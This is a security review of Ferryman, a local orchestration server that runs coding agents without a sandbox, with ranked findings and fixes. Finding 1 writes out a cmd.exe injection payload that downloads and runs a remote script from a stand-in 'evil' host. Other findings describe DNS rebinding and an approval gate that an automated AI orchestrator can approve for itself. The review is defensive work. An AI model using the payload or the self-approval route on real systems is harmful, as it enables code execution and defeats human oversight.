# Ferryman — Independent Security Review

*Reviewer: outside AI security reviewer, no stake in the project. Ground truth is the code, not the docs.*
*Date: 2026-07-23. Scope: full source clone (`ferryman-core`, `ferryman-server`, `ferryman-cli`, `ferryman-worker-sdk`, `scripts/`, `openapi/`, `docs/`).*

> Remediation status for every finding below is tracked in
> `docs/AI_SAFETY_REVIEW.md` ("Independent review & remediation"). Fixes for
> #1/#3/#4/#7/#8/#9 shipped and were verified.

## One-paragraph summary

Ferryman is a local-first orchestration "bridge": an Axum HTTP server (loopback by default) that stores jobs/memory/artifacts in SQLite, mints scoped tokens, gates side-effectful work behind approvals/consents, and hands jobs to *workers*. The server itself is fairly disciplined — it binds loopback, spawns only `git` with argument vectors (never a shell), parameterizes every SQL query, sanitizes project IDs into safe directory slugs, encrypts recovery packs with authenticated crypto, forbids `unsafe`, and hashes stored tokens. **The real teeth are in the worker**: the reference `agent_worker` spawns an arbitrary coding agent CLI (`claude`, `codex`, …) with the job's prompt and **no sandbox**, running as the full OS user. The repo's own `docs/AI_SAFETY_REVIEW.md` is unusually honest about that central risk, and most of its specific claims check out. But the review found real issues the docs do **not** flag: a Windows `cmd.exe` argument-injection path in the worker, the shipped systemd/hub setup running in unauthenticated dev-mode with a hard-coded demo token, no Host-header/DNS-rebinding protection on the loopback service, an approval gate that shares the same credential as job submission (so an automated token holder can self-approve), and a policy envelope that is advisory-only despite being listed as a mitigation. None are unconditionally "trivially remote-root," but several materially widen the blast radius of the (accepted) core risk.

## Component / data-flow map

```
operator (ferry CLI, project token)        admin (FERRYMAN_ADMIN_TOKEN)
        |  HTTP /v1/projects/{p}/jobs (prompt in input.prompt)   |
        v                                                        v
+-------------------------------- ferryman-server (Axum, 127.0.0.1) ----------+
|  auth: checked() project token | checked_admin() | checked_worker() |       |
|  SqliteStore (ferryman-core): projects, jobs, events, artifacts, memory,    |
|     consents, workers  — all params bound, tokens stored as SHA-256         |
|  spawns `git` only: workspace.rs (init) + recovery_targets.rs (clone/push)  |
|  writes only under --data roots; recovery packs = XChaCha20+HMAC            |
+------------------^--------------------------------+-------------------------+
     lease (worker token)                           | mints short-lived worker token
                    |                               v
        +-----------+-----------+        job.input.prompt travels verbatim
        |  ferryman-worker-sdk  |----------------------+
        |  agent_worker example |                      v
        |  Command::new(agent)  |----> claude/codex ... FULL OS-USER PRIVS, NO SANDBOX
        +-----------------------+       (reads/writes files, runs shell, network)
```

Trust boundary that matters: everything left of the worker is orchestration/gating; everything at/after the worker is unconfined code execution as you.

---

## Findings (ranked)

### 1. [HIGH] Windows `cmd.exe` argument injection from an untrusted job prompt
**File:** `crates/ferryman-worker-sdk/examples/agent_worker.rs` (`agent_command`), prompt built in `build_args`, spawned in `run_agent`.

On Windows, when `AGENT_CMD` is not an existing `.exe` (the default `claude` is a `.cmd`/shim, so this is the common path), the worker launched the agent via `cmd /c <agent> <args…>`. The job prompt is substituted into an argv element and passed to `cmd.exe`. Rust's argv-to-command-line encoder only quotes tokens containing spaces/quotes; it does **not** neutralize `cmd.exe` metacharacters (`& | < > ^ %`), and a no-space payload is passed through unquoted. `cmd.exe` then re-parses and acts on those metacharacters. This is the well-known "BatBadBut" class of Windows argument-injection.

**Scenario:** A job is submitted with `{"input":{"prompt":"hi&calc.exe"}}` (or a real payload like `x&powershell -c iwr http://evil/x.ps1|iex`). The token `hi&calc.exe` has no space, is not quoted, and `cmd /c claude -p hi&calc.exe --permission-mode auto` executes `calc.exe` regardless of what `claude` does. Anyone who can submit a job to a project a Windows worker serves gets arbitrary command execution as the worker's user — *before and independent of* the agent's own permission mode.

**Fix:** Do not route untrusted arguments through `cmd /c`. Resolve the shim to its real interpreter/target and spawn the executable directly (Rust std applies correct batch-file escaping for `.cmd`/`.bat` since CVE-2024-24576).

### 2. [HIGH] The worker runs a coding agent unsandboxed as the full OS user; the prompt is attacker-influenced
**File:** `crates/ferryman-worker-sdk/examples/agent_worker.rs` (`run_agent`); prompt origin `crates/ferryman-server/src/lib.rs` (`submit_job`) → `input.prompt`.

Once a job is leased, `run_agent` spawns the configured agent with `--permission-mode auto` (default) and no bridge-side sandbox, in the worker's cwd, with the OS user's full rights. The prompt flows verbatim from whoever can submit a job. The bridge's policy envelope, approval gate, and "deny by default" do **not** constrain the agent's actions. This is the central, intended risk and the docs are candid about it — but it is still the dominant safety fact: **running Ferryman's worker is equivalent to letting the chosen agent run arbitrary code as you.**

**Fix (mitigation, since this is by design):** Run each worker under a dedicated least-privilege OS account, in a disposable workdir with no secrets/repos, behind the agent's own sandbox flags.

### 3. [HIGH] Shipped hub/systemd setup runs in unauthenticated dev mode with a hard-coded demo token
**Files:** `scripts/hub-up.sh`, `scripts/wsl-bridge.sh`, `scripts/start-local.ps1` (server launched with **no** `--production`/`--no-demo-project`); auth gap `crates/ferryman-server/src/lib.rs` (`checked_admin` returns Ok when no admin token is set); demo token `crates/ferryman-server/src/main.rs`.

The durable services these scripts install launched `ferryman-server` without an admin token, so **project create / list / delete are completely unauthenticated** for anyone who can reach the port, and a demo project is auto-created with the source-constant token `"demo-local-token"`. Loopback binding limits this to local callers on a single-user machine, but it combines with Finding 4 (DNS rebinding) and Findings 1/2 to reach code execution.

**Fix:** Ship the units with a generated `FERRYMAN_ADMIN_TOKEN` and `--no-demo-project`; make `checked_admin` require the admin token for admin routes.

### 4. [MEDIUM] No Host-header / DNS-rebinding protection on the loopback service
**File:** `crates/ferryman-server/src/lib.rs` (`app`) — request-id and trace layers only, no Host validation.

A loopback bind is not a security boundary against browsers: a malicious web page can use DNS rebinding to make `http://attacker.example` resolve to `127.0.0.1`, turning cross-origin requests into same-origin. With admin routes open in dev (Finding 3) the page can create/delete projects, and if the victim runs a worker on a project whose token the attacker knows (`demo`/`demo-local-token`), it can submit a job prompt and reach code execution (Findings 1/2).

**Fix:** Reject any request whose `Host` is not `127.0.0.1:<port>`/`localhost:<port>`; keep admin routes authenticated.

### 5. [MEDIUM] Approval gate is not credential-separated from job submission
**File:** `crates/ferryman-server/src/lib.rs` (`submit_job` vs `approve_job`, both `checked`).

Both submitting a job and approving a `requires_approval` job use the **same** project token. The approval gate therefore only stops the *worker* (which holds a worker token) from self-leasing — it does **not** stop the project-token holder from submitting and immediately approving. If that token is held by an automated orchestrator/AI (the intended usage), "human approval" is not enforced.

**Fix:** Require a distinct credential for `approve_job`/`approve_consent` (admin token or a dedicated approver token, like `checked_memory_write`).

### 6. [MEDIUM] Policy envelope is advisory-only but presented as a mitigation
**File:** `crates/ferryman-core/src/lib.rs` (`PolicyEnvelope`, defaults all `Deny`); only consumer is `simulate_policy`, which merely *reports*.

A job's `policy` (filesystem/network/shell = Deny by default) is stored and can be "simulated," but nothing enforces it against the agent. A job whose policy denies filesystem/network/shell still runs an agent with full access to all three. `docs/AI_SAFETY_REVIEW.md` listed "Policy envelope" under how the risk is limited, which overstates it.

**Fix:** Either translate the policy into concrete agent sandbox flags and refuse to launch if it can't be honored, or relabel it everywhere as advisory metadata.

### 7. [LOW] Non-constant-time comparison of admin and memory-write tokens
**File:** `crates/ferryman-server/src/lib.rs` (`supplied == Some(expected.as_str())`).

The admin and memory-write tokens are raw secrets compared with `==` (short-circuits → timing side channel). Project/worker tokens are compared as SHA-256 hashes. Practical exploitation over loopback is hard but avoidable.

**Fix:** Constant-time comparison for the raw-secret comparisons.

### 8. [LOW] A worker can post log events to any job in its project
**File:** `crates/ferryman-server/src/lib.rs` (`worker_event`) → `append_worker_event`. `checked_worker` validates the worker token but not that the worker currently leases `job_id`.

Any registered worker in a project can inject arbitrary `worker.log`/event payloads onto *other* jobs in the same project — transcript forgery that can mislead an operator. Same-project scope only.

**Fix:** Require the worker to hold the active lease for `job_id` before appending events.

### 9. [LOW] `start-local.ps1` pre-wires an external GitHub recovery remote by default
**File:** `scripts/start-local.ps1` (`-RecoveryGitRepository 'https://github.com/estejosh/ferryman-recovery.git'`).

Local dev start configured a private-git recovery *target* pointing at the author's GitHub repo by default. Delivery is still consent-gated, so nothing is pushed silently, but it contradicts the docs' framing that outbound targets exist only after you name one, and names a third-party repo for the user.

**Fix:** Leave `--recovery-git-repository` unset by default.

### 10. [LOW] Secrets emitted by the agent are not redacted in events/SSE/transcripts
**File:** redaction is key-name based (`crates/ferryman-core/src/lib.rs`); the worker streams stdout `message` verbatim and uploads the full transcript as an artifact.

`redact()` only masks values under keys whose name contains `token/secret/password/...`. Anything the agent prints (API keys, file contents) is stored in the events table, streamed over SSE to any project-token holder, and persisted in the transcript artifact.

**Fix:** Document the limitation; optionally scrub transcript/stdout for common secret patterns, or make transcript upload opt-in.

### 11. [INFO] Update-apply TOCTOU; ff-only still builds+runs origin code on `--confirm`
**Files:** `crates/ferryman-cli/src/bin/ferryman-updater.rs`; `scripts/apply-update.sh`.

The updater is careful (read-only check exits 10; `update-bridge` requires `--confirm`, clean tree, `--ff-only`, never configures origin). But `update-bridge` re-fetches after the operator reviewed `check-remote`, so a commit added between review and confirm is what merges; `apply-update.sh --confirm` then rebuilds and restarts from it. A compromised origin plus an approving human = code execution. Mitigated by human confirm; no pin/signature on the reviewed commit.

**Fix:** Have `update-bridge` verify the exact commit hash the operator reviewed; consider signature verification.

### 12. [INFO] `FERRYMAN_SUDO_PW` passed to `sudo -S` via script environment
**Files:** `scripts/hub-up.sh`, `wsl-bridge.sh`, `apply-update.sh`, `attach-bridge.sh`.

A convenience path pipes a sudo password from an env var into `sudo -S`. Not injected into a command line (uses `printf`), but it lives in the script's environment and encourages storing the sudo password in plaintext.

**Fix:** Prefer interactive sudo or a one-time `sudo` timestamp; document the exposure.

---

## Things that are genuinely solid (verified, not just claimed)

- **No SQL injection.** Every statement uses bound parameters. `list_jobs` builds its query by concatenation but only appends fixed clauses and placeholder tokens — no user data is interpolated. Confirmed clean.
- **No project-ID path traversal.** `slug()` lowercases, maps every non-alphanumeric to `-`, drops empties — `"../../etc/passwd"` → `"etc-passwd"`, all-symbol id → empty → `bail`. (Minor: two ids can slug to the same dir — a collision, not an escape.)
- **No `unsafe`.** `#![forbid(unsafe_code)]` across sources plus a workspace lint. Dependencies mainstream; `reqwest` uses rustls; keychain via `keyring`.
- **Recovery-pack crypto is sound.** Envelope encryption with per-pack random data key, XChaCha20-Poly1305 AEAD, HMAC-SHA256 over the manifest, SHA-256 integrity checks, strict validation, read-only no-auto-dispatch import that chmods the tree read-only. Tamper test passes.
- **Token storage.** Project/worker tokens stored only as SHA-256 hashes; raw project token never returned; worker token returned once, scoped, 8h expiry.
- **Server process spawning is `git`-only, argv-form, no shell.** Provisioning refuses a workspace that already has a remote.

---

## VERDICT

**Would an outside AI deem this safe to download and use? Conditionally yes for a single-user personal machine, with real caveats — and no for shared/multi-user hosts or untrusted job sources.**

The **code you download and read is not malware**: no telemetry, no phone-home, no hidden exfiltration, no obfuscation, no `unsafe`, no SQL injection, no path traversal, loopback-by-default, sound recovery crypto, a server that spawns only `git`. Cloning, reading, and building it is safe.

**Running it meaningfully means running the worker, and that is exactly as safe as letting your chosen coding agent execute arbitrary code as your user** — the tool provides orchestration and gating, not containment. On top of that inherent risk this review found concrete issues the docs did not flag (Findings 1, 3, 4, 5, 6). Use it only under the conditions in the VERDICT/remediation notes: least-privilege worker account + disposable workdir, only trusted jobs, an absolute-`.exe` `AGENT_CMD` on Windows (or the fixed build), a hub run with an admin token and `--no-demo-project`, loopback-only, and confirming the origin before any update. Do not use it on a multi-user host, with untrusted prompts, or expecting the policy/approval features to contain what the agent does.
